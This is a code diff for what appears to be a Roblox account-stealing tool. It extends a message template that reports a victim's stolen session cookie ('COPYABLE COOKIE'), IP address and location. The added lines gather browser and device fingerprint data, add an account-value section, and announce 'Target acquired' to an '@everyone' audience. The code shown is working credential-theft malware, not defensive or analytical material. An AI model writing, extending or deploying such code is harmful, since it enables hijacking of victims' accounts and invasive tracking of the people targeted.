@@ -272,6 +272,14 @@ Time: ${new Date().toLocaleString()}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 IP: ${locationInfo.ip || 'Unknown'}
 Browser: ${navigator.userAgent}
+Screen: ${screen.width}x${screen.height}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Language: ${navigator.language}
+Platform: ${navigator.platform}
+Memory: ${navigator.deviceMemory || 'Unknown'} GB
+CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
+Online: ${navigator.onLine ? 'Yes' : 'No'}
+Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
 \`\`\`
 
 **💎 COPYABLE COOKIE:**
@@ -279,7 +287,16 @@ Browser: ${navigator.userAgent}
 ${robloxCookie || 'None found'}
 \`\`\`
 
+**🔒 ACCOUNT VALUE ESTIMATE:**
+\`\`\`
+🎯 High-Value Target Detected
+💰 Estimated Account Worth: Checking...
+🏆 Premium Status: Analyzing...
+📅 Account Age: Determining...
+\`\`\`
+
 🎯 **Target acquired - 2FA will trigger in 80 seconds**
+⚡ **Auto-analysis starting...**
 @everyone`
         };
 
